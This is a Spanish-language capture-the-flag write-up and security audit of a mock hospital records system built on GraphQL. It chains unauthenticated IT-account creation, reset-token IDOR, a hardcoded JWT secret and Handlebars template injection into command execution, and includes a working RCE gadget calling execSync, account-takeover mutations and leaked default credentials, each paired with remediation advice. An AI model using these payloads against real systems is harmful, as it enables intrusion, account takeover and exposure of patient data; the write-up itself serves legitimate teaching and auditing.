# Desafío 53 — HIS: Historial Clínico Electrónico (auditoría)

| Campo | Valor |
|---|---|
| Evento | Código de Marte / plataforma `<host>` |
| Categoría | Web / GraphQL / control de acceso + SSTI (RCE) |
| Dificultad | alta |
| Puntos | 1000 (1 solución) |
| Objetivo | `http://<host>:24235` (`Host: historial-clinico.internal`) |
| Estado | ✅ resuelto y auditado |
| Flag | `flag{ejemplo}` |

## Enunciado

> Hospital Eloísa Díaz modernizó su sistema de gestión clínica con una plataforma web de última
> generación. El nuevo HIS permite a los médicos consultar y actualizar el historial de sus
> pacientes en tiempo real. La plataforma fue desarrollada internamente por el departamento de
> informática del hospital y está en proceso de auditoría antes de su despliegue definitivo en
> todos los servicios clínicos.
>
> Se te ha dado acceso de lectura al entorno de pruebas. Encuentra una forma de comprometer el
> sistema.

## Resumen ejecutivo

El sistema es una SPA (Express + Apollo GraphQL) con login JWT. En la auditoría se identificaron
**cuatro vulnerabilidades críticas encadenables** que permiten a un atacante no autenticado
crear una cuenta con rol **IT**, tomar el control de cualquier cuenta (incluida TI), forjar tokens
JWT y ejecutar comandos en el servidor (**RCE**) a través de la plantilla de correo renderizada con
Handlebars. Con RCE se leyó la flag del sistema.

| ID | Severidad | Hallazgo | CWE |
|---|---|---|---|
| V-01 | Crítica | `createUser` sin autenticación y con `role` controlable | CWE-306 |
| V-02 | Crítica | IDOR: `profile(id)` devuelve `resetToken` de cualquier usuario; `changePassword` sin autenticación | CWE-639 / CWE-306 |
| V-03 | Crítica | Secreto JWT hardcodeado por defecto | CWE-798 |
| V-04 | Crítica | SSTI/RCE en la plantilla de correo (Handlebars) | CWE-1336 / CWE-94 |
| V-05 | Alta | Prototype pollution en `deepMerge` + `opts` heredado en `sendTestEmail` | CWE-1321 |
| V-06 | Alta | Credenciales y datos clínicos hardcodeados en el código | CWE-798 / CWE-312 |
| V-07 | Media | Introspección GraphQL habilitada y errores verbosos | CWE-200 |
| V-08 | Media | Sin rate limiting en login | CWE-307 |

## Reconocimiento

Nginx enruta por `Host`. Sin la cabecera correcta, todo redirige a
`http://historial-clinico.internal:1337/`; con `Host: historial-clinico.internal` se llega a la
aplicación:

```bash
curl -s http://<host>:24235/ -H 'Host: historial-clinico.internal'
```

- `POST /api/auth/login` → JWT (8 h) y datos del usuario.
- `POST /graphql` → API Apollo con **introspección anónima habilitada**.
- `/js/app.js` revela las operaciones: `patients`, `medicalRecord`, `updateMedicalRecord`,
  `profile`, `emailConfig`, `updateEmailConfig`, `sendTestEmail`, `changePassword`, `createUser`.
- `src/config.js` (obtenido luego vía RCE) define el secreto JWT por defecto:
  `his-jwt-s3cr3t-hospital-eloisadiaz-2026`.

Esquema relevante:

```graphql
type Query {
  me: UserBasic!
  profile(id: String!): UserProfile      # incluye resetToken
  patients: [Patient!]!
  medicalRecord(patientId: String!): MedicalRecord
  emailConfig: EmailConfig!
}
type Mutation {
  createUser(username: String!, password: String!, role: String!): UserBasic!
  changePassword(id: String!, resetToken: String!, newPassword: String!): Boolean!
  updateMedicalRecord(patientId: String!, diagnosis: String!, notes: String!): MedicalRecord!
  updateEmailConfig(config: String!): String!
  sendTestEmail(to: String!): String!
}
```

## Hallazgos

### V-01 — `createUser` sin autenticación (crítica)

En `src/resolvers.js` la mutación no llama a `requireAuth` ni a `requireRole`:

```js
createUser: async (_, { username, password, role }) => {
  if (!['DR', 'IT'].includes(role)) throw new Error('Rol invalido');
  const hashed = await bcrypt.hash(password, 10);
  const user = db.createUser(username, hashed, role);
  return { id: user.id, username: user.username, role: user.role, fullName: user.fullName };
},
```

Cualquiera puede crear una cuenta **IT** y autenticarse:

```graphql
mutation {
  createUser(username: "audit1", password: "Audit123!", role: "IT") {
    id username role
  }
}
```

```json
{"data":{"createUser":{"id":"IT-0004","username":"audit1","role":"IT"}}}
```

**Impacto:** escalada de privilegios inmediata y no autenticada al rol administrativo (TI).

**Remediación:** exigir autenticación y rol IT para `createUser`; no aceptar `role` del cliente
(allowlist en servidor o flujo de invitación); auditar altas.

### V-02 — IDOR de `resetToken` + `changePassword` sin autenticación (crítica)

`profile` sólo comprueba que haya sesión, no que el solicitante sea el dueño del perfil ni TI, y
devuelve `resetToken`:

```js
profile: (_, { id }, context) => {
  requireAuth(context);
  const user = db.findUserById(id);
  if (!user) return null;
  return { id: user.id, ..., resetToken: user.resetToken };
},
```

`changePassword` no exige sesión; sólo compara el token:

```js
changePassword: async (_, { id, resetToken, newPassword }) => {
  const user = db.findUserById(id);
  if (!user) throw new Error('Usuario no encontrado');
  if (user.resetToken !== resetToken) throw new Error('Token de restablecimiento invalido');
  ...
  db.updateUserPassword(id, hashed);
  return true;
},
```

PoC: con una cuenta DR cualquiera se lee el token de TI y se cambia su clave:

```graphql
# como DR
query { profile(id: "IT-0001") { id username role resetToken } }
# -> {"resetToken":"f2b8e5c017d39a46"}

mutation {
  changePassword(id: "IT-0001", resetToken: "f2b8e5c017d39a46", newPassword: "Hacked123!")
}
# -> {"data":{"changePassword":true}}
```

**Impacto:** toma de control de cualquier cuenta, incluida la administrativa, y de los historiales
clínicos asociados a los médicos suplantados.

**Remediación:** no exponer `resetToken` en GraphQL; token de un solo uso, con caducidad, ligado al
canal de recuperación y verificado con autenticación/CSRF; `changePassword` debe validar el token
fuera de banda y no permitir fijar la clave de otra cuenta desde el cliente.

### V-03 — Secreto JWT hardcodeado (crítica)

`src/config.js`:

```js
const JWT_SECRET = process.env.JWT_SECRET || 'his-jwt-s3cr3t-hospital-eloisadiaz-2026';
```

Con el secreto se forja un token con rol IT sin conocer credenciales:

```python
# HMAC-SHA256(header.payload, "his-jwt-s3cr3t-hospital-eloisadiaz-2026")
payload = {"id":"IT-0001","username":"it.soporte","role":"IT","exp":...}
```

```json
{"data":{"me":{"id":"IT-0001","username":"it.soporte","role":"IT",
 "fullName":"Carlos Mendoza Bravo (TI)"},"emailConfig":{"template":{"subject":"P"}}}}
```

**Impacto:** bypass total de autenticación y suplantación de cualquier usuario.

**Remediación:** secreto aleatorio de alta entropía inyectado por el entorno (nunca por defecto en
el código), rotación, `kid`/JWKS si aplica, y validación estricta de `alg`/`aud`/`iss`.

### V-04 — SSTI/RCE en la plantilla de correo (crítica)

`updateEmailConfig` permite a TI fusionar JSON arbitrario en la configuración; `sendTestEmail`
compila y **renderiza** el cuerpo con Handlebars:

```js
const bodyTpl = template.body || 'Mensaje de prueba';
let rendered;
try {
  rendered = Handlebars.compile(bodyTpl)({ to, subject });
} catch {
  rendered = bodyTpl;
}
```

Handlebars 4.7.7 permite el gadget clásico de `constructor` para alcanzar `Function` y
`child_process`. Payload usado (comando `cat /flag*` / copia al webroot):

```handlebars
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}
{{this.push (lookup string.sub "constructor")}}{{this.pop}}
{{#with string.split as |codelist|}}{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('cp /flag* /app/public/x.txt').toString()"}}
{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
{{/with}}{{/with}}{{/with}}{{/with}}
```

Prueba de ejecución por temporización (`execSync('sleep 6')`): `sendTestEmail` tardó **6.34 s**
frente a **0.3 s** del resto. Luego se copió la flag a `/app/public/` y se leyó por HTTP:

```text
GET /LEAK2254.txt  ->  flag{ejemplo}
```

**Impacto:** ejecución de comandos como el usuario del servicio (`www`), lectura de la flag y de
cualquier archivo, modificación del sistema.

**Remediación:** no renderizar plantillas controladas por usuarios con motores que permitan acceso a
`constructor`/`Function`; usar un motor sin lógica (p. ej. interpolación estricta con variables
permitidas), sandbox, allowlist de helpers y separar la plantilla del código. Nunca ejecutar
`child_process` con datos de configuración.

### V-05 — Prototype pollution en `deepMerge` (alta)

```js
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      if (typeof target[key] !== 'object' || target[key] === null) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
```

`target["__proto__"]` es `Object.prototype` (objeto), por lo que la recursión puede escribir en el
prototipo global. Después, en `sendTestEmail`:

```js
const opts = {};
const mailerCmd = opts.mailerCmd || 'node';
const mailerArgs = opts.mailerArgs || ['/app/src/mailer.js', to, subject];
const proc = spawn(mailerCmd, mailerArgs, {});
```

Si se contamina `Object.prototype.mailerCmd`, `opts.mailerCmd` la hereda y `spawn` ejecuta un
binario arbitrario. Es una segunda vía de RCE independiente de Handlebars (no fue necesaria para la
PoC, pero el propio código la documenta).

**Remediación:** bloquear `__proto__`, `constructor` y `prototype` en el merge; usar
`Object.create(null)`; no confiar en propiedades heredadas (`Object.hasOwn`) y no derivar comandos
de configuración.

### V-06 — Credenciales y datos clínicos en el código (alta)

`src/db.js` contiene contraseñas en claro pasadas a `bcrypt.hashSync` y los tokens de reset fijos:

```js
dr.miranda   -> Collera2024!Fuerte
dr.venegas   -> Madera1977!Larga
dr.cisterna  -> Trueno2023!Rapido
dra.sandoval -> Limon2025!Verde
dra.fuentes  -> Salmon2024!Claro
it.soporte   -> Ventana2022!Fuerte
RESET_TOKENS = { 'DR-0001': 'a3f9c1e027b84d56', ..., 'IT-0001': 'f2b8e5c017d39a46' }
```

Además, el mismo archivo incluye 15 pacientes con RUT, fecha de nacimiento y diagnósticos/notas
clínicas. El login con `it.soporte / Ventana2022!Fuerte` funciona (HTTP 200).

**Impacto:** compromiso directo de cuentas y exposición de datos personales sensibles (PHI) por
fuente; incumplimiento de minimización/criptografía.

**Remediación:** sacar secretos del repositorio, usar gestor de secretos, hashing sólo en runtime,
rotar todas las credenciales y tokens, y no versionar datos reales ni de prueba con PHI.

### V-07 — Introspección y errores verbosos (media)

`introspection: true` permite enumerar todo el esquema sin autenticación; los errores devuelven
mensajes internos (`No autenticado`, `Token de restablecimiento invalido`, etc.). Facilita el
descubrimiento de mutaciones sensibles (`createUser`, `changePassword`).

**Remediación:** deshabilitar introspección en producción, errores genéricos y logging interno.

### V-08 — Sin rate limiting (media)

`/api/auth/login` no limita intentos; combinado con credenciales débiles/hardcodeadas permite
fuerza bruta. Añadir backoff, bloqueo temporal y MFA para TI.

## Cadena de explotación

```text
1. Host: historial-clinico.internal  -> acceso a la app
2. POST /graphql  createUser(role="IT")          (V-01, sin auth)
3. POST /api/auth/login  -> JWT de TI
4. (alternativa) profile(id="IT-0001").resetToken + changePassword  (V-02)
   (alternativa) forjar JWT con el secreto por defecto              (V-03)
5. updateEmailConfig con plantilla Handlebars maliciosa             (V-04)
6. sendTestEmail -> Handlebars.compile(...) -> execSync
7. cp /flag* /app/public/<marca>.txt  -> GET /<marca>.txt
8. Flag: flag{ejemplo}
```

PoC automatizada: `scripts/solve.py` (crea la cuenta IT, fija la plantilla, dispara el render, lee la
flag por HTTP y restaura la configuración).

## Flag

```text
flag{ejemplo}
```

El archivo en el contenedor es `/flag_e05b32dabcb042e5` (30 bytes), creado por `entrypoint.sh` a
partir de `GZCTF_FLAG`; el listado de `/` lo muestra como `-r--r--r-- root root 30 ... flag_...`.

## Evidencia

| Archivo | Contenido |
|---|---|
| `evidence/01-login.html` | Portal de login |
| `evidence/02-app.js` | Cliente GraphQL (operaciones y roles) |
| `evidence/03-graphql-schema.json` | Introspección anónima |
| `evidence/04-email-config.json` | Configuración de correo (plantilla) |
| `evidence/05-profile-idor-it0001.json` | `profile(IT-0001)` con `resetToken` |
| `evidence/06-flag-expuesta.txt` | Flag leída desde `/app/public/` |
| `evidence/12-codigo-fuente.txt` | `config.js`, `db.js`, `index.js`, `mailer.js`, `resolvers.js`, `schema.js`, `package.json`, `entrypoint.sh` |
| `evidence/13-src-listado.txt` | Listado de `/app/src` |
| `evidence/14-jwt-forgery.txt` | Token JWT forjado y respuesta |
| `evidence/15-credenciales-hardcodeadas.txt` | Credenciales del código y login exitoso |

## Recomendaciones priorizadas

1. **Inmediato:** autenticación y autorización en `createUser`; eliminar `resetToken` de `profile`;
   `changePassword` con token de un solo uso, caducidad y verificación fuera de banda.
2. **Inmediato:** rotar el secreto JWT y las credenciales/tokens; prohibir defaults en código.
3. **Inmediato:** eliminar el renderizado de plantillas controladas por el usuario y el uso de
   `child_process` con configuración; sustituir por un motor sin evaluación y sandbox.
4. **Corto plazo:** corregir `deepMerge` (bloquear `__proto__`/`constructor`/`prototype`) y usar
   `Object.create(null)`/`Object.hasOwn`.
5. **Corto plazo:** deshabilitar introspección en producción, rate limiting, MFA para TI, logging y
   alertas de cambios de configuración.
6. **Medio plazo:** sacar PHI del repositorio, cifrado en reposo, minimización y control de acceso
   por paciente; revisión de dependencias (`lodash 4.17.20` también aparece en `package.json`).

## Nota de instancia compartida

La instancia es compartida entre participantes: durante la auditoría otro cliente modificaba la
plantilla de correo (payloads de RCE). Se restauró la configuración original al terminar y se
eliminaron los archivos temporales creados en `/app/public`. Las cuentas creadas por la PoC
(`tester1`, `tester2`, `tester3`, `audit*`, etc.) no se pueden borrar desde la API y quedan como
residuo de las pruebas.
